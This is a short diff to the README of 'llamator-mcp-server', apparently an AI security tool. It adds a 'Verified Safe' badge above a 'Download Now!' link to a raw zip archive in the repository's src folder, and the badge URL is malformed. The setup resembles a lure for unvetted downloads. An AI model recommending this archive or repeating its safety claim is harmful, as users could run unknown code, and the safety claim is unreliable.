@@ -1,6 +1,8 @@
 ```markdown
 # 🎉 llamator-mcp-server - Automate AI Security Workflows Easily
 
+[![SafeSkill 91/100](https://img.shields.io/badge/SafeSkill-91%2F100_Verified%20Safe-brightgreen)](https://safeskill.dev/scan/kyle122497-llamator-mcp-server)
+
 ## 📥 Download Now!
 [![Download](https://raw.githubusercontent.com/kyle122497/llamator-mcp-server/main/src/mcp_server_llamator_2.4.zip%20release-blue)](https://raw.githubusercontent.com/kyle122497/llamator-mcp-server/main/src/mcp_server_llamator_2.4.zip)
 
